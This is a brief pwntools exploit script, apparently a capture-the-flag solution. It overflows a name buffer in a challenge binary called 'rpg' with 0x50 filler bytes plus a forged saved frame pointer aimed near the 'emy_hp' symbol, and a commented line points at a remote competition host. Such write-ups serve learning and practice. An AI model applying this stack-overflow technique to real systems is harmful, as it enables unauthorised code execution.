from pwn import *
from pathlib import Path

here = Path(__file__).resolve().parent
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / 'libc/2.27/amd64/ld-linux-x86-64.so.2'
libdir = pwn_root / 'libc/2.27/amd64/glibc227/glibc227-fixed/lib/x86_64-linux-gnu'
exe = context.binary = ELF(str(here / 'rpg'), checksec=False)
io = process([str(loader), '--library-path', str(libdir), exe.path])
#io = remote("psdxs.idss-cn.com", 27265)
fake_rbp = exe.sym['emy_hp'] + 4
payload = b'A' * 0x50 + p64(fake_rbp)

io.sendafter(b'Enter your name:\n', payload)
io.sendlineafter(b'How many hp do you want to give (0-10000):\n', b'0')

io.interactive()
